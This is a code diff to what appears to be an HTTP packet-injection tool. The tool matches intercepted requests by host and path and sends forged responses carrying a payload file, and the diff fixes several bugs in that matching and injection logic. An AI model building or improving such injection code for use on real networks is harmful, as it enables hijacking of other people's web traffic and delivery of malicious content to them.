@@ -119,7 +119,7 @@ gboolean ao_payload_init()
         // Identification ruleset
         target->cap_type = PL_CAP_HTTP;
         target->cap_http_host = g_key_file_get_string(key, groups[i], "cap_http_host", NULL);
-        target->cap_http_path = g_key_file_get_string(key, groups[i], "cap_http_host", NULL);
+        target->cap_http_path = g_key_file_get_string(key, groups[i], "cap_http_path", NULL);
         
         // Injection ruleset
         target->inj_type = PL_INJ_HTTP;
@@ -136,9 +136,10 @@ gboolean ao_payload_init()
                 target->inj_http_pl_size = ftell(fs);
                 fseek(fs, 0, SEEK_SET);
                 target->inj_http_pl_data = g_malloc(target->inj_http_pl_size);
-                gint num = fread(target->inj_http_pl_data, target->inj_http_pl_size, 1, fs);
+                gint num = fread(target->inj_http_pl_data, 1, target->inj_http_pl_size, fs);
                 if (num != target->inj_http_pl_size) {
-                    g_print("[pay] unable to read all data!\n");
+                    g_print("[pay] unable to read all data! read=%u, size=%u\n",
+                        num, target->inj_http_pl_size);
                 }
                 fclose(fs);
             } else {
@@ -217,13 +218,15 @@ void ao_payload_pck(st_ao_packet* pck)
     http_parser_execute(&http_inst, &http_settings, NULL, 0);
     
     // Log
-    g_print("[www] host=%s, request=%s\n",
-        http_data.hdr_host ? http_data.hdr_host : "<NULL>",
-        http_data.req_url ? http_data.req_url : "<NULL>"
-    );
-    
-    // Inject
-    ao_payload_cap(pck, &http_data);
+    if (http_inst.method == HTTP_GET || http_inst.method == HTTP_POST) {
+        g_print("[pay] http request! host=%s, request=%s\n",
+            http_data.hdr_host ? http_data.hdr_host : "<NULL>",
+            http_data.req_url ? http_data.req_url : "<NULL>"
+        );
+        
+        // Inject
+        ao_payload_cap(pck, &http_data);
+    }
     
     // Free
     if (http_data.req_url)
@@ -251,9 +254,10 @@ void ao_payload_cap(st_ao_packet* pck, st_http_data* http_data)
             
             gint match_host = 0;
             if (target->cap_http_host && http_data->hdr_host)
-                match_path = g_regex_match_simple(target->cap_http_host, http_data->hdr_host, 0, 0) ? 2 : 1;      
+                match_host = g_regex_match_simple(target->cap_http_host, http_data->hdr_host, 0, 0) ? 2 : 1;      
             
             // Check if matches
+            g_print("[pay] http match! path=%d, host=%d\n", match_path, match_host);
             if ((match_path == 2 || match_host == 2) && !(match_path == 1 || match_host == 1)) {
                 ao_payload_inj(pck, target);
                 return;
@@ -268,7 +272,7 @@ void ao_payload_cap(st_ao_packet* pck, st_http_data* http_data)
 
 void ao_payload_inj(st_ao_packet* pck, st_pl_target* target)
 {
-    g_print("[inj] target=%s\n", target->pl_name);
+    g_print("[pay] target=%s\n", target->pl_name);
     
     // HTTP injection
     if (target->inj_type == PL_INJ_HTTP) {
@@ -289,9 +293,9 @@ void ao_payload_inj(st_ao_packet* pck, st_pl_target* target)
             "%s"
             "\r\n",
             inj_location ? 301 : 200,
-            target->inj_http_content_type ? target->inj_http_content_type : "text/html; charset=utf-8",
+            target->inj_http_content_type != NULL ? target->inj_http_content_type : "text/html; charset=utf-8",
             target->inj_http_pl_size,
-            inj_location
+            inj_location ? inj_location : ""
         );
         if (inj_location)
             g_free(inj_location);
